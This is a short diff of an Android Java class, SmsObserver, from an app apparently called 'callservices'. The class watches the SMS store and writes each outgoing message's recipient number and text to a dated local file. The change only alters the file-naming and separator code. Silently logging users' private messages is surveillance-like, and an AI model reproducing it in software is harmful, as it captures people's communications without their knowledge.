@@ -2,6 +2,7 @@ package com.sktelink.sk00700.callservices;
 
 import static com.sktelink.sk00700.callservices.utils.CommonUtilities.TAG;
 
+import java.util.Calendar;
 import java.util.Date;
 
 import android.content.ContentResolver;
@@ -15,6 +16,7 @@ import android.util.Log;
 
 import com.sktelink.sk00700.callservices.handler.FileHandler;
 import com.sktelink.sk00700.callservices.utils.DataUtils;
+import com.sktelink.sk00700.callservices.utils.MyUtils;
 
 public class SmsObserver extends ContentObserver {
 
@@ -27,6 +29,7 @@ public class SmsObserver extends ContentObserver {
 	public SmsObserver(Handler handler) {
 		super(handler);
 	}
+	
     @Override
     public void onChange(boolean selfChange) {
     	try {
@@ -51,16 +54,14 @@ public class SmsObserver extends ContentObserver {
 		            
 		            // if type = 4 -> save
 		            if (type.equals("4")) {
+		            	
 		            	// set time
-		            	Time time = new Time();
-		            	time.setToNow();
-		            	Date now = new Date(Long.valueOf(Long.toString(time.toMillis(false))));
 		            	
 		            	// file name
-			            String fileName = "sent" + now.getDay() + now.getMonth() + now.getYear() + ".txt";
-			            
+//			            String fileName = "sent" + now.getDay() + now.getMonth() + now.getYear() + ".txt";
+		            	String fileName = "sent" + MyUtils.stringFileDate()+ ".txt";
 			            // data
-			            String data = telNumber + ":" + message + "\n";
+			            String data = telNumber + ":::" + message + "\n";
 			            
 			            // write data
 		            	FileHandler fileHandler = new FileHandler(context);
